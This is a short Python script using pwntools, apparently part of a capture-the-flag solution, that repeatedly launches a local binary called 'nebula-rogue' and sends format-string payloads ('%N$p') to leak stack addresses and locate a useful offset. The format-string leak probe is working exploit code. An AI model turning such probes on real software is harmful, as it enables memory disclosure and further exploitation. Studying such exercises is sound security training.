from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./nebula-rogue', checksec=False)

encounter = 0
for i in range(1, 100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        p.sendlineafter(b'> ', '3'.format(i).encode())
        p.sendlineafter(b': ', '%{}$p'.format(i).encode())

        result = p.recvuntil(b'\n\n')

        result_decoded = result.decode().split(" ")[-1].strip()

        if result_decoded[-3:] == '040': # Based on static analysis, we can find that the last three byte of the address is 040
            encounter += 1
            log.info('Found ' + str(encounter) + ' offset at index ' + str(i))
            log.info(result_decoded)
            p.close()
        else:
            p.close()
    except EOFError:
        pass